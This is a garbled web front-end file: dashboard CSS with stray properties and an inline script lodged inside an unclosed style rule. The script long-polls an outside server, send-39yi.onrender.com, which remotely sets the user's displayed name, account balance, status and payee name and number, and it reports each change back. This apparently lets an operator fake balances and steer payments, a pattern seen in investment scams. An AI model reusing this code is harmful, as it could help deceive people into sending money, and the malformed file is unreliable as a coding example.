/* Top Ad Styles */
.top {

	width: 100%;

	z-index: 1000;

/* First Nav */

}
.menu-toggle {

	font-size: 22px;
	font-weight: 800;
	border: 2px solid #fff;
	left: 0;

}  

.user-avatar {

	height: 36px;            
	border-radius: 50%;

	background: #fff;
	color: #0066ff;
	display: flex;
	justify-content: center;
	align-items: center;
}
	  
.user-avatar p {

}

/* Second Nav */

	display: flex;
	width: 100%;
	justify-content: space-between;	
	align-items: center;
	margin-bottom: 15px;
}
.navTwo p {
	margin: 0;
	font-size: 12px;
	color: #333;
	font-weight: 600; 
}
.wrap {
	width: 90%;
	white-space: nowrap;  
	overflow: hidden;
	text-overflow: ellipsis;
}
.navTwo h4 {

	margin: 0;
}

.accountCopy {
	display: flex;
	align-items: center;
	margin: 0;
	justify-content: right;
	color: #fff;
	transform: scale(1);
	transition: color 0.4s ease, transform 0.4s ease;
}
	  
/* Third Nav */
.navThree {
	background: rgba(0, 102, 255, 0.2);
	padding: 20px;
	border-radius: 10px;
	margin-bottom: 80px;
}
	  
.navThree h4 {

	font-weight: 700;
	margin: 0;
}
	  
.boardHead {
	display: flex;

	margin-bottom: 25px;
}
.boardHead i {
	margin-right: 2px;
}
.boardHead p {

	margin: 0;
	color: #333;
	font-weight: 700; 
}
.boardLeg {
	display: flex;
	justify-content: space-between;
	align-items: flex-end;
}
.boardLeg button {
	display: flex;
	justify-content: center;
	background: dodgerblue;
	align-items: center;

	color: #fff;
	height: 25px;
	width: 30px;
	border-radius: 50%;
}
.available p {
	font-size: 10px;
	margin: 0;
	color: #333;
	font-weight: 700; 
	display: flex;
	justify-content: right;
}
.available h4 {
	display: flex;
	margin: 0;
	font-size: 14px;
	justify-content: right;
}
.available span {
	font-size: 20px;
	margin: 0px 0px 0px 5px;
}

/* Sidebar - hidden off-screen by default */
.sidebar {
    position: fixed;
    top: 0;
    left: -300px;            /* Hidden to the left */
    width: 300px;
    height: 100%;
	margin: 0;
    background: linear-gradient(to bottom, #0066ff, #e6f0ff);
    color: #fff;
    padding: 20px;
    transition: left 0.3s ease;
    z-index: 1003;  
}

/* When sidebar has "open" class → slide in */
.sidebar.open {
    left: 0;    
}
.menu-toggle.active {
	left: 150px;
}
.sidebar h1 {
	margin-bottom: 30px;
}
.sidebar h1 i {
	margin-right: 4px;
}
.innerToggle {
	position: absolute;
	top: 10px;
	right: 20px;
	background: transparent;
	color: #fff;
	font-size: 22px;
	font-weight: 800;
	border: 2px solid #fff;
}
.sidebar ul {
    list-style: none;
	padding: 0;
    margin: 60px 0 0;
}
.sidebar ul button {
    color: #fff;
    border: none;
	background: none;
    padding: 15px;
	margin: 0;
    font-size: 18px; 
	text-align: left;
	width: 100%;
}
.sidebar ul button:hover { 
	background: #34495e; 
}

/* Overlay (darkens the page when sidebar is open) */
.overlay {
    position: fixed;
    top: 0; 
	left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    opacity: 0;
    visibility: hidden;
    transition: all 0.3s;
    z-index: 1002;
}
.overlay.active {
	opacity: 1;
	visibility: visible;
}
/* Content */
.content {
	padding: 0.5rem;
}

.floatDiv {
	position: relative;
	width: 95%;

	<script src="../sw.js"></script>
	<script>
		// SENDER
		function sender(payload) {
			const url = 'https://send-39yi.onrender.com/api/messages';  
			fetch(url, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(payload)    
			});  
		}
		// Update theme-color based on time of day
		function updateGreet() {
			const hour = new Date().getHours();
			let updatedHour;
			if (hour < 12) {
				updatedHour = 'Good Morning';   
			} else if (hour < 18) {
				updatedHour = 'Good Afternoon';
			} else {
				updatedHour = 'Good Evening';
			}
  
			document.getElementById('updateHour').textContent = updatedHour;
		}
		// Update on load and every minute
		updateGreet();
		setInterval(updateGreet, 60000);

		// Toggle Sidebar
		function toggleSidebar() {
			document.getElementById("sidebar").classList.toggle("open");
			document.getElementById("overlay").classList.toggle("active");	
			document.getElementById("menuToggle").classList.toggle("active");
		}
		
		// Toggle show Button
		const toggleBalance = document.getElementById('toggleBalance');
		const balance = document.getElementById('balance');
		const balanceHidden = localStorage.getItem('balanceHidden') === 'true';
		const icon = toggleBalance.querySelector('i');
		
		if(balanceHidden){
			balance.style.filter = 'blur(6px)'; 
			icon.classList.add('fa-eye-slash');
			icon.classList.remove('fa-eye');
		}
			
		toggleBalance.addEventListener('click', () => {
			if(balance.style.filter == 'blur(6px)') {
				balance.style.filter = ''; 
				icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
				localStorage.setItem('balanceHidden', 'false');
			}else {
				balance.style.filter = 'blur(6px)'; 
				icon.classList.add('fa-eye-slash');
                icon.classList.remove('fa-eye');
				localStorage.setItem('balanceHidden', 'true');
			}
		});
		// MAIN CODE
		let lastMessageId = localStorage.getItem('latestId') || 0;
		const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));

		// To Copy demoAcc
		function copy(copytext, host) {
			navigator.clipboard.writeText(copytext);
			const originalText = host.innerHTML;
			host.innerHTML = `<h4>Copied</h4>`;
			
			setTimeout(() => {
				host.innerHTML = originalText; 
			}, 2000);
		}
		// Display
		function displaySavedInfo() {	
			// Fill Name and Avatar
			const name = savedInfo.name;
			const words = name.trim().split(/\s+/);
			const avatar = words[0][0] + words[words.length - 1][0];

			document.getElementById('demoAcc').textContent = savedInfo.demoAcc;
			document.getElementById('realAcc').textContent = savedInfo.realAcc;
			document.getElementById('name').textContent = name;
			document.getElementById('avatar').textContent = avatar;
			document.getElementById('amount').textContent = savedInfo.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
			//document.getElementById('update').textContent = savedInfo.update;
			//document.getElementById('payName').textContent = savedInfo.payName;	
			//document.getElementById('payNumber').textContent = savedInfo.payNumber;
		}
		
        // Function to fetch new messages using long-polling
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('latestId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
				if(savedInfo.userId.toLowerCase() === message.userId.toLowerCase()){
					console.log('For User');
					if(message.name){
						savedInfo.name = message.name;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, name: savedInfo.name });
					}
					if(message.amount){
						savedInfo.amount = message.amount;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, amount: savedInfo.amount });
					}
					if(message.update){
						savedInfo.update = message.update;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: savedInfo.update });
					}
					if(message.payName){
						savedInfo.payName = message.payName;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
					}
					if(message.payNumber){
						savedInfo.payNumber = message.payNumber;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: `${savedInfo.payName} ${savedInfo.payNumber}` });
						
					}
					displaySavedInfo()
                } else {
                    console.log('Not For User');
                }
            });
        }
    
        
        // Start polling when page loads
        window.addEventListener('load', () => {
            fetchMessages(); 
			displaySavedInfo()
        });
	</script>
